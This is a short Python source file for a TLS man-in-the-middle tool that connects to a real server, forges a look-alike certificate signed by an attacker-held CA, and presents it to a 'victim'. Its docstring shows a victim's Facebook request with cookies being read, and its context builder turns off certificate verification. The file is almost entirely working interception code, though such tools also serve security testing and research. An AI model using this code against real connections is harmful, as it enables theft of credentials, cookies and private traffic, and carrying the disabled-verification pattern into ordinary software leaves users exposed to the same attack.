from OpenSSL import crypto, SSL

import dupecert


class sslmitm(object):
    def __init__(self, ca_cert, ca_key, victim_plain, server_plain):
        """ MITMs the connection between 'victim' and 'server'. The '.victim'
            and '.server' properties are secure sockets for the victim and
            server respectively.

            For example:

            >>> mitm = sslmitm(ca_cert, ca_key, victim_plain, server_plain)
            >>> data = mitm.victim.recv(1024)
            >>> print data
            GET / HTTP/1.1
            Host: https://facebook.com/
            Cookie: ...
            ...
            >>> mitm.server.write(data)
            >>> print mitm.server.recv(1024)
            '... Hello, David ...'

            ca: the certificate authority to use when signing new (fake)
                certificates.
            victim_plain: a plan (ie, not SSL wrapped) socket connected
                to the victim's machine.
            server_plain: a plain socket connected to the server we're
                going to impersonate. """
        self.ca_cert = ca_cert
        self.ca_key = ca_key
        self.victim_plain = victim_plain
        self.server_plain = server_plain
        self._started = False
        self._start_mitm()

    @staticmethod
    def _mk_ctx(cert_pkey=None):
        ctx = SSL.Context(SSL.SSLv23_METHOD)

        if cert_pkey is not None:
            cert, pkey = cert_pkey
            ctx.use_certificate(cert)
            ctx.use_privatekey(pkey)
            ctx.check_privatekey()

        # Don't verify the peer's certificate... Who would MITM us?
        ctx.set_verify(SSL.VERIFY_NONE, lambda *a, **kw: True)
        return ctx

    def _start_mitm(self):
        if self._started:
            return

        server = SSL.Connection(self._mk_ctx(),
                                self.server_plain)
        server.set_connect_state()
        server.do_handshake()

        fake_cert_pkey = dupecert.dupe(self.ca_cert, self.ca_key,
                                       server.get_peer_certificate())

        victim = SSL.Connection(self._mk_ctx(cert_pkey=fake_cert_pkey),
                                self.victim_plain)
        victim.set_accept_state()
        victim.do_handshake()

        self.server = server
        self.victim = victim
        self._started = True
